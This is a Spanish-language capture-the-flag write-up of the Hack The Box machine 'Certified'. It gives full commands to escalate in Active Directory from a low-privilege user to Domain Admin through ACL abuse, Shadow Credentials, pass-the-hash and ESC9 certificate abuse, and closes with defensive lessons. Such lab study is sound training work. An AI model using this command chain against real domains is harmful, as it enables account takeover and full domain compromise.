---
title: "HTB: Certified · de WriteOwner a Domain Admin encadenando ACLs, Shadow Credentials y ESC9"
date: 2026-09-12
draft: false
tags: ["hackthebox", "active-directory", "windows", "adcs", "escalada-privilegios", "certipy", "bloodhound"]
summary: "Una máquina de brecha asumida donde no hay ni una sola vulnerabilidad de software: el dominio entero cae por cinco permisos mal delegados y una plantilla de certificado a la que le falta una extensión de seguridad, encadenados hasta convertir a un usuario de a pie en Administrator del dominio."
---

## Resumen

Certified es un Controlador de Dominio Windows retirado de dificultad media de Hack The Box, y es la máquina que mejor ilustra una idea que cuesta interiorizar cuando vienes del mundo de los exploits: en un Active Directory real casi nunca te hace falta un CVE. Aquí no se explota ningún software desactualizado, no hay desbordamiento de búfer, no se crackea ni una sola contraseña. Todo el compromiso del dominio se construye sobre permisos que alguien delegó mal y una plantilla de certificado mal configurada.

La máquina es de tipo "brecha asumida" (*assumed breach*): el enunciado te entrega unas credenciales de usuario sin privilegios, igual que si un empleado hubiera picado en un phishing. A partir de ahí, la cadena es:

1. **`WriteOwner` sobre un grupo.** El usuario inicial puede cambiar el propietario del grupo `Management`, y el propietario de un objeto en AD siempre puede reescribir sus propios permisos.
2. **Toma de propiedad y auto-concesión de permisos.** Convertirse en propietario, darse `FullControl` sobre el grupo y añadirse como miembro.
3. **Herencia de permisos por pertenencia a grupo.** El grupo `Management` tiene `GenericWrite` sobre la cuenta de servicio `management_svc`, así que al entrar en el grupo se hereda ese permiso.
4. **Shadow Credentials.** Con `GenericWrite` sobre una cuenta se le puede inyectar una credencial de certificado falsa y autenticarse como ella por Kerberos PKINIT, sin conocer su contraseña, obteniendo su hash NTLM de paso. Esto da la flag de usuario por WinRM.
5. **Segundo salto de ACL y ESC9.** `management_svc` tiene `GenericAll` sobre `ca_operator`, y `ca_operator` puede solicitar certificados de una plantilla a la que le falta la extensión de seguridad que ata el certificado a un SID concreto. Suplantando el UPN se obtiene un certificado válido para el Administrator del dominio.

Objetivo: `10.129.231.186`, Controlador de Dominio del dominio `certified.htb`, con Servicios de Certificados de Active Directory (AD CS) instalados.

## Enumeración

Escaneo TCP completo con scripts por defecto y detección de versiones:

```bash
nmap -sC -sV -p- -oN nmap-certified.txt 10.129.231.186
```

El resultado es el retrato robot de un Controlador de Dominio moderno: DNS, Kerberos, RPC, NetBIOS, LDAP y LDAPS, SMB, el catálogo global en 3268 y 3269, WinRM en 5985 y el servicio web de AD en 9389. Sin puerto 80, sin nada web que tocar.

Lo primero, como siempre, es comprobar si el acceso anónimo funciona en algún sitio:

```bash
rpcclient -U "" -N 10.129.231.186 -c enumdomusers
ldapsearch -x -H ldap://10.129.231.186 -s base namingcontexts
```

Aquí la máquina se diferencia de clásicos como Cascade: la sesión nula de RPC se establece, pero **todas** las consultas devuelven `ACCESS_DENIED`, y el bind anónimo de LDAP se rechaza directamente. `enum4linux-ng` confirma el mismo muro. Eso no es un fallo de la técnica, es la configuración correcta y por defecto en un Windows Server moderno, y es la señal de que esta caja no está pensada para entrar a ciegas.

Volviendo al enunciado de la máquina aparece la pieza que faltaba, unas credenciales de partida:

```
judith.mader : judith09
```

Esto es lo que en un encargo real se llama un escenario de brecha asumida. No se evalúa si un atacante puede conseguir credenciales, se asume que ya las tiene (phishing, fuga, reutilización) y se mide **hasta dónde puede llegar desde ahí**. Es, con diferencia, el escenario más realista y el que más se contrata.

## Reconocimiento autenticado

Con credenciales válidas, el panorama cambia por completo:

```bash
netexec smb 10.129.231.186 -u judith.mader -p judith09 --shares
```

Solo `SYSVOL` y `NETLOGON`, ambos de lectura. Merece la pena revisarlos porque los scripts de inicio de sesión y las políticas de grupo son un sitio clásico donde se filtran contraseñas (`cpassword` en preferencias de GPO), pero aquí solo hay la política de dominio por defecto sin nada aprovechable. El único dato útil que sale del `GptTmpl.inf` resulta profético para el resto de la máquina:

```
MaxClockSkew = 5
```

Es decir, el dominio solo tolera cinco minutos de desfase de reloj en Kerberos. Guarda ese dato.

El siguiente paso es buscar cuentas Kerberoasteables:

```bash
impacket-GetUserSPNs certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

Aparece `management_svc`, una cuenta de servicio con un SPN registrado y miembro del grupo `Management`. Interesante como objetivo, aunque el hash TGS que se obtiene no cae con `rockyou`, así que la vía del crackeo se acaba ahí. El dato que sí importa es el que se ve de refilón: existe un grupo llamado `Management` y la cuenta de servicio pertenece a él.

## BloodHound y análisis de ACLs sin interfaz gráfica

Cuando la enumeración clásica se agota, el siguiente paso en Active Directory no es buscar más servicios, es buscar **relaciones de permisos**. BloodHound recolecta todos los usuarios, grupos, equipos y GPOs del dominio junto con sus listas de control de acceso, y permite encontrar caminos de escalada que ningún escaneo de puertos enseñaría jamás.

```bash
bloodhound-python -u judith.mader -p judith09 -d certified.htb -ns 10.129.231.186 -c All --zip
```

Los flags `-d` y `-ns` no son opcionales aquí: sin ellos, la herramienta intenta resolver el dominio con el DNS del sistema, que no apunta al Controlador de Dominio, y revienta con un `dns.name.EmptyLabel`.

No hace falta montar Neo4j para sacar valor de esos JSON. Con `jq` se puede consultar exactamente lo mismo. Primero, el SID del usuario que controlamos:

```bash
jq -r '.data[] | select(.Properties.samaccountname=="judith.mader") | .ObjectIdentifier' *_users.json
```

Y después, todos los permisos que ese SID tiene sobre cualquier objeto del dominio:

```bash
SID="S-1-5-21-729746778-2675978091-3820388244-1103"

jq -r --arg sid "$SID" '
  .data[] |
  (.Properties.name // .Properties.samaccountname // .ObjectIdentifier) as $target |
  (.Aces // [])[] |
  select(.PrincipalSID == $sid) |
  "\(.RightName)\t-> \($target)"
' *.json
```

Resultado:

```
WriteOwner  -> MANAGEMENT@CERTIFIED.HTB
```

Repitiendo la consulta con el SID del propio grupo `Management` aparece la segunda mitad del camino:

```
GenericWrite -> MANAGEMENT_SVC@CERTIFIED.HTB
```

Ahí está la cadena completa dibujada: `judith.mader` manda sobre el grupo `Management`, y el grupo `Management` manda sobre la cuenta `management_svc`.

## Abuso de ACLs · propiedad, DACL y pertenencia

Conviene entender por qué `WriteOwner` es tan grave, porque no es intuitivo. En Active Directory, el propietario de un objeto **siempre** puede modificar la lista de permisos de ese objeto, tenga o no un permiso explícito para ello. Es decir, poder cambiar el propietario equivale a poder concederse a uno mismo cualquier permiso más adelante. Es la diferencia entre tener la llave de un despacho y ser el dueño del edificio: el dueño siempre puede hacerse una copia de la llave que quiera.

El abuso son tres pasos. Primero, tomar la propiedad del grupo:

```bash
impacket-owneredit -action write -new-owner judith.mader -target Management \
  certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

Segundo, ya como propietario, concederse control total sobre él:

```bash
impacket-dacledit -action write -rights FullControl -principal judith.mader -target Management \
  certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

Tercero, con control total, añadirse como miembro:

```bash
net rpc group addmem "Management" "judith.mader" \
  -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```

Y aquí una lección operativa que costó tiempo: **verifica siempre, no asumas**. La primera escritura de DACL pareció ir bien pero no llegó a aplicarse, y el fallo solo salió a la luz al intentar el `addmem`, que devolvió `NT_STATUS_ACCESS_DENIED`. Las herramientas de impacket pueden fallar de formas silenciosas. Después de cada paso conviene leer el estado real:

```bash
impacket-owneredit -action read -target Management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
impacket-dacledit -action read -principal judith.mader -target Management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
net rpc group members "Management" -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```

Con la pertenencia al grupo confirmada, se hereda el `GenericWrite` sobre `management_svc`. Merece la pena subrayar el mecanismo, porque es el mismo patrón que aparece una y otra vez en AD: los permisos no se evalúan solo mirando tu cuenta, se evalúan mirando **todos los SIDs que llevas encima**, incluidos los de cada grupo al que perteneces. Entrar en un grupo es heredar, de golpe, todo lo que ese grupo puede hacer.

## Shadow Credentials · autenticarse sin saber la contraseña

`GenericWrite` sobre una cuenta de usuario permite escribir atributos suyos, y uno de esos atributos es `msDS-KeyCredentialLink`, el campo que Windows Hello for Business usa para asociar una clave pública a una cuenta. Si puedes escribir ahí, puedes registrar **tu propio** par de claves como método de autenticación válido de esa cuenta, pedir un TGT por Kerberos PKINIT presentando tu certificado, y de paso recuperar el hash NTLM de la víctima. Sin tocar su contraseña, sin que se entere nadie y sin dejar la cuenta rota.

```bash
certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 \
  -account management_svc -dc-ip 10.129.231.186
```

Y aquí es donde aquel `MaxClockSkew = 5` pasa factura. Kerberos rechaza cualquier ticket cuyas marcas de tiempo se desvíen más de cinco minutos de las del Controlador de Dominio, y el reloj del laboratorio va desfasado respecto al real:

```
KRB_AP_ERR_SKEW(Clock skew too great)
```

La solución no es solo sincronizar, es **dejar de resincronizar**: en Kali, `systemd-timesyncd` está reajustando el reloj a la hora real continuamente, peleándose con la hora del laboratorio. Hay que desactivarlo primero y lanzar el comando inmediatamente después, todo seguido:

```bash
sudo timedatectl set-ntp false
sudo net time set -S 10.129.231.186
certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc -dc-ip 10.129.231.186
```

```
[*] Got TGT
[*] NT hash for 'management_svc': a091c1832bcdd46...
```

Ese hash NTLM no hay que crackearlo. Es un error muy común (y sí, perdí un rato tirándole `hashcat` y `john`): un hash NTLM **es** la credencial a efectos de autenticación NTLM. Se usa directamente:

```bash
evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd46...
```

Flag de usuario capturada.

## Post-explotación · el siguiente eslabón

Dentro, `whoami /all` da el contexto:

```
CERTIFIED\Management                        Group
BUILTIN\Remote Management Users             Alias
BUILTIN\Certificate Service DCOM Access     Alias
```

Sin privilegios jugosos (`SeImpersonate` no aparece), sin credenciales guardadas en `cmdkey /list`, y el resto del disco denegado. Pero `Certificate Service DCOM Access` es una pista muy clara sobre por dónde va la máquina, y el nombre de la propia caja es la otra.

Repitiendo el mismo análisis de ACLs con el SID de `management_svc` aparece el siguiente salto:

```
GenericAll -> CA_OPERATOR@CERTIFIED.HTB
```

`GenericAll` es control total, así que el ataque de Shadow Credentials se repite igual, esta vez apuntando a `ca_operator`:

```bash
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd46... \
  -account ca_operator -dc-ip 10.129.231.186
```

Nuevo hash, nueva cuenta. WinRM con ella falla (`WinRMAuthorizationError`), porque `ca_operator` no pertenece al grupo de acceso remoto. No importa: su valor no es el shell, es su papel dentro de la infraestructura de certificados.

## AD CS y ESC9 · un certificado sin remitente

Los Servicios de Certificados de Active Directory (AD CS) son, en esencia, la oficina de expedición de carnés de identidad digitales del dominio. Los certificados que emite pueden usarse para autenticarse en la red exactamente igual que una contraseña, y qué certificados se pueden pedir y quién puede pedirlos lo definen las **plantillas de certificado**.

La enumeración con `certipy-ad find` autenticado como `management_svc` no encuentra nada. Lanzado como `ca_operator`, cambia todo:

```bash
certipy-ad find -u ca_operator@certified.htb -hashes <hash_ca_operator> \
  -dc-ip 10.129.231.186 -vulnerable
```

```
Template Name             : CertifiedAuthentication
Enrollment Flag           : PublishToDs, AutoEnrollment, NoSecurityExtension
Extended Key Usage        : Server Authentication, Client Authentication
Enrollment Rights         : CERTIFIED.HTB\operator ca
[!] Vulnerabilities
  ESC9                    : Template has no security extension.
```

Esto es ESC9. Normalmente, un certificado de autenticación lleva incrustada una extensión (`szOID_NTDS_CA_SECURITY_EXT`) que graba el SID del titular, de forma que el Controlador de Dominio puede comprobar de manera fuerte a qué cuenta pertenece ese certificado. El flag `NoSecurityExtension` elimina esa comprobación, y entonces el KDC cae de vuelta al método débil: mapear el certificado a la cuenta que coincida con el UPN que figura en él.

Y el UPN es un atributo de la cuenta, escribible por cualquiera que tenga control sobre ella. Como `management_svc` tiene `GenericAll` sobre `ca_operator`, se puede reescribir el UPN de `ca_operator` para que diga `administrator`, pedir el certificado con esa identidad prestada y devolver el atributo a su sitio después:

```bash
# 1. suplantar el UPN
certipy-ad account update -u management_svc@certified.htb -hashes <hash_management_svc> \
  -user ca_operator -upn administrator -dc-ip 10.129.231.186

# 2. solicitar el certificado como ca_operator, ya con el UPN falseado
certipy-ad req -u ca_operator@certified.htb -hashes <hash_ca_operator> \
  -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186

# 3. devolver el UPN a su valor original
certipy-ad account update -u management_svc@certified.htb -hashes <hash_management_svc> \
  -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
```

El certificado resultante se guarda directamente como `administrator.pfx`, lo cual ya adelanta el desenlace. Al usarlo para autenticarse, el KDC lo mapea a la cuenta que toca:

```bash
certipy-ad auth -pfx /home/kali/administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Got TGT
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b4960...
```

Pass the hash por última vez:

```bash
evil-winrm -i 10.129.231.186 -u administrator -H 0d5b4960...
```

Flag de root capturada. Compromiso total del dominio.

## Lecciones

Lo interesante de Certified es que no hay ni un solo parche que hubiera evitado esto. Son decisiones de configuración:

- **`WriteOwner` es equivalente a control total, solo que con un paso intermedio.** Cualquier auditoría de permisos que trate `WriteOwner` como un permiso menor está clasificando mal el riesgo. El propietario de un objeto en AD puede reescribir siempre sus propios permisos.
- **Los permisos se heredan a través de los grupos, y el que puede entrar en un grupo hereda todo lo que el grupo puede hacer.** Delegar sobre grupos es cómodo de administrar y peligroso si alguien puede modificar la pertenencia.
- **`msDS-KeyCredentialLink` debe tratarse como un atributo crítico.** Poder escribirlo equivale a poder suplantar la cuenta entera. Si no se usa Windows Hello for Business, ese atributo no debería ser escribible por nadie que no sea administrador.
- **Una plantilla de certificado con `NoSecurityExtension` rompe el vínculo fuerte entre certificado y cuenta.** Combinada con capacidad de escritura sobre el UPN de cualquier cuenta que pueda solicitar certificados, se convierte en una vía directa a Domain Admin. La mitigación real pasa por eliminar ese flag y por aplicar el mapeo fuerte de certificados (KB5014754).
- **AD CS es superficie de ataque de primer nivel y casi nunca se audita.** Una CA mal configurada no es un problema de una aplicación, es un problema de toda la identidad del dominio.

*Los flags están parcialmente ocultos, por convención.*
